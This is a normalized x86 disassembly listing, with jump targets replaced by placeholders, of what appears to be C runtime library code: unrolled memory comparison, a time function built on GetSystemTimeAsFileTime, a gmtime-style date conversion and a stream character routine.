movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
sub_100292e1
push [ rw-data ]
call sub_1002eeed
pop ecx
test eax eax
je r-xdata
push 0x19
call sub_10031b9e
push 0x1
push 0x0
call sub_1002c30f
add esp 0xc
jmp sub_1002c1f8
call eax
sub_1002930b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push 0x0
add eax 0x2ac18000
push 0x989680
adc ecx 0xfe624e21
push ecx
push eax
call sub_1002e2a0
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_1002935c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp esi edi
jne r-xdata
push 0x24
push 0xff
push esi
call sub_10027650
mov eax [ ebp + 0xc ]
add esp 0xc
cmp eax edi
je r-xdata
call sub_1002d4db
push 0x16
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_10027801
add esp 0x14
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
jg r-xdata
pop edi
pop esi
leave
retn
cmp eax 0x7
jl r-xdata
jl r-xdata
push ebx
push edi
push 0x1e13380
push eax
push ecx
call sub_1002e5d0
mov ecx eax
add ecx 0x46
lea eax [ ecx + 0x12b ]
cdq
mov ebx 0x190
idiv ebx
lea edi [ ecx - 0x1 ]
push 0x64
mov [ ebp - 0x8 ] edi
mov [ ebp + 0x8 ] ecx
mov ebx eax
mov eax edi
cdq
pop edi
idiv edi
push 0xffffffff
push 0xfffffe93
sub ebx eax
mov eax [ ebp - 0x8 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea eax [ ebx + eax - 0x11 ]
cdq
mov edi eax
lea eax [ ecx - 0x46 ]
mov ebx edx
cdq
push edx
push eax
call sub_1002e310
sub eax edi
sbb edx ebx
push 0x0
mov ebx 0x15180
push ebx
push edx
push eax
call sub_1002e310
mov edi [ ebp - 0x10 ]
add edi eax
adc [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jg r-xdata
jg r-xdata
call sub_1002d4db
push 0x16
pop esi
mov [ eax ] esi
jmp r-xdata
cmp ecx 0xffff5740
jae r-xdata
mov eax [ ebp + 0x8 ]
mov ecx eax
and ecx 0x80000003
jns r-xdata
jl r-xdata
cmp ecx 0x934126cf
ja r-xdata
mov eax esi
jmp r-xdata
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov eax [ ebp - 0x8 ]
add edi 0x1e13380
adc [ ebp - 0xc ] 0x0
mov ecx eax
and ecx 0x80000003
mov [ ebp + 0x8 ] eax
jns r-xdata
test edi edi
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x76c
cdq
mov ecx 0x190
idiv ecx
test edx edx
jne r-xdata
push 0x64
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov eax [ ebp + 0x8 ]
push 0x0
push ebx
push [ ebp - 0xc ]
mov [ esi + 0x14 ] eax
push edi
call sub_1002e5d0
push 0xffffffff
mov [ esi + 0x1c ] eax
cdq
push 0xfffeae80
push edx
push eax
call sub_1002e310
add edi eax
adc [ ebp - 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
mov edx rw-data
jne r-xdata
mov [ ebp - 0x4 ] 0x1
add eax 0x76c
cdq
mov ecx 0x190
idiv ecx
test edx edx
jne r-xdata
push 0x64
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
mov eax [ esi + 0x1c ]
xor ecx ecx
inc ecx
cmp [ edx + 0x4 ] eax
jge r-xdata
mov edx rw-data
add edi ebx
adc [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec ecx
mov [ esi + 0x10 ] ecx
sub eax [ edx + ecx * 4 ]
push 0x0
mov [ esi + 0xc ] eax
mov eax [ ebp + 0xc ]
push ebx
push [ eax + 0x4 ]
push [ eax ]
call sub_1002e5d0
push 0x7
add eax 0x4
pop ecx
cdq
idiv ecx
xor ebx ebx
push ebx
push 0xe10
push [ ebp - 0xc ]
push edi
mov [ esi + 0x18 ] edx
call sub_1002e5d0
push 0xffffffff
mov [ esi + 0x8 ] eax
cdq
push 0xfffff1f0
push edx
push eax
call sub_1002e310
push ebx
add edi eax
adc [ ebp - 0xc ] edx
push 0x3c
push [ ebp - 0xc ]
push edi
call sub_1002e5d0
mov [ esi + 0x4 ] eax
imul eax eax 0x3c
sub edi eax
mov [ esi + 0x20 ] ebx
mov [ esi ] edi
xor eax eax
pop ebx
mov ebx eax
inc ecx
cmp [ edx + ecx * 4 ] ebx
jl r-xdata
mov ebx 0x15180
sub_1002959f
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10031f10
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
push esi
call sub_1002935c
neg eax
sbb eax eax
pop ecx
not eax
pop ecx
and eax esi
sub_100295c6
push 0xc
push r--data
call sub_1002fdfc
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
push esi
call sub_1002a645
pop ecx
mov [ ebp - 0x4 ] edi
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_1002d4db
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_10031f47
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_1002fe41
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100296ca
mov eax [ ebp - 0x1c ]
dec [ esi + 0x4 ]
js r-xdata
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
push esi
push [ ebp + 0x8 ]
call sub_10030cf5
pop ecx
pop ecx
mov ecx [ esi ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
movzx eax al
inc [ esi ]
jmp r-xdata
call sub_1002d4db
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10027801
